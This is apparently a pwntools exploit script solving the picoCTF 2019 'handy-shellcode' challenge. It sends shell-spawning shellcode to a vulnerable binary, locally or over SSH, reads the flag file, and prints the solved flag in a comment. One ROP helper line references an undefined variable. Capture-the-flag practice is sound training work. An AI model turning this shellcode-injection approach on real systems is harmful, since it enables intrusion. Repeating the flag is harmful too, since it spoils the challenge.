from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{h4ndY_d4ndY_sh311c0d3_4dc9a786}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

r2 = r2pipe.open(BINARY)
plts = r2.cmd('ii').strip().split('\n')[2:]
r2.quit()
plts = filter(lambda x: 'GLOBAL    FUNC' in x, plts)
plts = filter(lambda x: '_' not in x, plts)
plts = map(lambda x: x.split('  GLOBAL    FUNC '), plts)
plts = map(lambda x: (int(x[0].split(' ')[-1], 16), x[1]), plts)
temp = {}
for addr, name in plts:
  temp[name] = addr
plts = temp
print plts

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('/problems/handy-shellcode_4_b724dbfabf610aaa4841af644535be30/vuln')
  REMOTE = True

# payload = ''

sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.sendlineafter('$ ', 'cat /problems/handy-shellcode_4_b724dbfabf610aaa4841af644535be30/flag.txt')
sh.interactive()
  